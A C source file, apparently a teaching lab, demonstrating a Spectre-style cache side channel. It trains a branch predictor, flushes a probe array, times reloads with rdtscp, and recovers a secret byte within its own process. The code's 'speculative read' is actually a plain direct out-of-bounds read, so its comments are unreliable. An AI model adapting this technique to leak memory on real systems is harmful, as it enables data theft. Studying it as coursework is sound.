#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <time.h>

#define CACHE_HIT_THRESHOLD 200  // For Chuck
#define ATTACK_ATTEMPTS     30   // Run the attack this many times

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
char *secret = "Some Secret Value";

typedef struct datablock {
    uint8_t lpad[2048];   // Ensures dat is isolated
    uint8_t dat;
    uint8_t rpad[2047];   // Total size = 4096 bytes (1 page)
} DataBlock;

DataBlock array[256];

/**
 * Sandbox Function - Returns the value of the buffer if you are making a request within
 * its bounds, otherwise returns 0.
 */
uint8_t restrictedAccess(size_t x) {
    if (x <= bound_upper && x >= bound_lower) {
        return buffer[x];
    } else {
        return 0;
    }
}

/**
 * Flush each array[i].dat from the CPU caches so we can detect
 * which one gets reloaded by the speculative side-channel.
 */
void flushSideChannel(void) {
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&array[i].dat);
    }
}

/**
 * Scan all 256 entries, timing each with rdtscp around the load.
 * Return the index with the lowest access time if under threshold, else 0xFF.
 */
uint8_t reloadSideChannel(void) {
    int aux = 0;
    uint64_t best_time = UINT64_MAX;
    int best_index = 0;

    for (int i = 255; i >= 0; i--) {
        volatile uint8_t *addr = &array[i].dat;
        uint64_t start = __rdtscp(&aux);
        aux = *addr;
        uint64_t end = __rdtscp(&aux);
        uint64_t delta = end - start;
        if (delta < best_time) {
            best_time = delta;
            best_index = i;
        }
    }

    if (best_time <= CACHE_HIT_THRESHOLD) {
        return (uint8_t)best_index;
    } else {
        return 0xFF;
    }
}

/**
 * Abuse the Spectre principle to steal a secret. After calling this
 * function, the cache is setup so we can extract the secret byte from array[].
 */
void spectreAttack(size_t larger_x) {
    uint8_t s;

    // Train the branch predictor
    for (int i = 0; i < 10; i++) {
        restrictedAccess(i);
    }

    // Flush the bounds check variable
    _mm_clflush(&bound_upper);

    // Flush the side-channel buffer
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&array[i].dat);
    }

    // New Task 6: direct speculative access to secret
    volatile uint8_t *target = (uint8_t *)buffer + larger_x;
    s = *target;             // speculative read
    array[s].dat += 1;       // encode into cache
}

/**
 * Busy-wait loop to separate repeated attempts
 */
void busy_wait(int delay) {
    for (volatile int i = 0; i < delay * 100000; i++) { }
}

int main(void) {
    // initialize the probe array
    for (int i = 0; i < 256; i++) {
        array[i].dat = 1;
    }

    // compute out-of-bounds index for the secret
    size_t secret_offset = (size_t)((char*)secret - (char*)buffer);
    fprintf(stderr, "Targeting address %p at offset %zu\n", secret, secret_offset);

    // tally results over multiple attacks
    int hit_counts[256] = {0};

    for (int round = 0; round < ATTACK_ATTEMPTS; round++) {
        flushSideChannel();
        spectreAttack(secret_offset);
        uint8_t leak = reloadSideChannel();
        if (leak != 0xFF) {
            hit_counts[leak]++;
        }
        busy_wait(10);
    }

    // find the byte seen most often
    int peak_hits = 0;
    int recovered_byte = -1;
    for (int i = 0; i < 256; i++) {
        if (hit_counts[i] > peak_hits) {
            peak_hits       = hit_counts[i];
            recovered_byte  = i;
        }
    }

    if (recovered_byte >= 0) {
        printf("The secret is %d (%c).\n", recovered_byte, recovered_byte);
    } else {
        printf("Failed to recover secret.\n");
    }

    return 0;
}
